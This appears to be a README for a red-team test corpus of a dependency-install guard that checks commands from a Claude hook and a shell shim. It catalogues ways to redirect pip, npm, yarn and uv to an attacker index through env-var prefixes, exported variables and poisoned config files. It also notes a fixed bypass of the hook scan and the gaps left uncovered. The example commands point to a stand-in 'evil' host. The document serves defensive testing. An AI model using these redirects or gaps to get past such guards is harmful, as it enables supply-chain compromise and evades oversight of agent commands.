# Red-team corpus — env-var + config registry redirection

An attacker who influences the install environment repoints package resolution
to an attacker index while DepWall vets the name against the public registry.
Two carriers: an inline `VAR=val` command prefix, or an ambient exported var
(poisoned `~/.bashrc` / `.envrc` / earlier command). The redirect is INVISIBLE
on the command line — every finding names its source var (`origin`).

Verdict ceiling is ASK (host evidence only; substitution is never provable).
`DEPWALL_REGISTRY_ALLOWLIST` silences a known host, incl. the plain-http warn for
a user-allowlisted host (localhost Verdaccio/devpi) — but http to a *public*
registry stays ASK (downgrade attack).

## Vectors covered (see tests/hook/envredirect.test.ts, guard-env-redirect.test.ts)

- **V1 anchor (full bypass, fixed):** a bare leading `FOO=bar npm install evil`
  prefix dropped the ENTIRE segment from the Claude-hook scan (assignment token
  became the head → ungated basename → install silently skipped). Now the run of
  leading `VAR=val` tokens is skipped at segment start and collected into
  `install.env`. (tests/hook/command-scan.test.ts)
- **V2 inline:** `PIP_INDEX_URL=https://evil pip install requests`,
  `env NPM_CONFIG_REGISTRY=https://evil npm i x`.
- **V3 ambient:** exported `PIP_INDEX_URL` / `NPM_CONFIG_REGISTRY` read from the
  process env (guard `deps.env ?? process.env`; shim path = live shell env).
- **V6 multi-value:** whitespace-split `PIP_EXTRA_INDEX_URL` / `UV_INDEX`
  (`name=url` prefix stripped) — each URL classified independently.
- **V7 cwd uv.toml:** `poisoned-uv.toml` (this dir) — `[[index]]` url pinning,
  read only on the lockless bare-`uv sync` path (same trust shape as pyproject).
- **Case bypass:** npm/pip/pipx/yarn env vars matched case-INSENSITIVELY — the
  managers honor any casing (`PIP_Index_Url`, `YARN_Npm_Registry_Server`,
  lowercase `npm_config_registry`), so a case-sensitive miss is a bypass, not an
  FP. **uv is exact-case** (reads env via Rust `std::env`) — `UV_Default_Index`
  mixed-case is intentionally NOT matched (asymmetry mirrors uv's behavior).
- **V7b `uv pip install` cwd uv.toml:** the uv pip interface honors the
  top-level `[[index]]`/`index-url` (verified from uv docs) → poisoned uv.toml +
  `uv pip install`/`uv pip sync` → ASK. `uvx`/`uv tool` ignore local config →
  NOT flagged (boundary, pinned by test).

## Honored env vars (verified against manager docs)

- pip/pip3/pipx: `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, `PIP_FIND_LINKS`,
  `PIP_TRUSTED_HOST` (pipx's pip inherits the env). `PIP_NO_INDEX` inert.
- uv/uvx: `UV_DEFAULT_INDEX`, `UV_INDEX_URL` (dep.), `UV_INDEX` (name= strip),
  `UV_EXTRA_INDEX_URL` (dep.), `UV_FIND_LINKS`. uv does NOT read `PIP_*`.
- npm/pnpm/npx: `npm_config_registry` (any casing).
- yarn: `YARN_NPM_REGISTRY_SERVER` (Berry), `YARN_REGISTRY` (classic),
  `npm_config_registry` — over-scoped within-family on purpose (ASK-only).

## FP guards (GOOD → ALLOW)

`NODE_ENV=production npm ci`, `CI=true npm install`, `HUSKY=0`,
`HTTPS_PROXY=…` (proxy inert), public-host pins (`registry.npmjs.org`,
`pypi.org`), empty value = unset, `pip list` / `npm run build` (scope gate),
classic resolved-URL lock (lock authoritative), cross-family non-attribution.

## Residuals (NOT covered — documented, see spec 2026-07-17)

- User/global config files: `~/.npmrc`, global npmrc, `~/.yarnrc(.yml)`, pip.conf
  platform paths, user/system `uv.toml`. Highest-FP surface; lockfile provenance
  backstops baked-in foreign hosts. pip has no cwd pip.conf → no cheap partial.
- Config-relocation vars: `PIP_CONFIG_FILE`, `UV_CONFIG_FILE`,
  `NPM_CONFIG_USERCONFIG/GLOBALCONFIG`, `YARN_RC_FILENAME`.
- uv.toml `[pip]`/`[tool.uv.pip]` section overrides (top-level `[[index]]` for
  `uv pip install`/`sync` IS now covered; the pip-section shape is not).
- `uvx`/`uv tool` cwd uv.toml (tool commands ignore local config — verified),
  and `uv add` cwd top-level uv.toml (refs>0 skips the bare-sync path).
- Quoted-space inline values on the Claude-hook path
  (`PIP_EXTRA_INDEX_URL="https://a https://b" pip …`) — the whitespace tokenizer
  mis-splits; the shim path covers it (real shell parses quotes, guard reads env).
- Same-command-string `export VAR=…; pip install x` across `;` segments — the
  shim path executes both in one shell and catches it live.
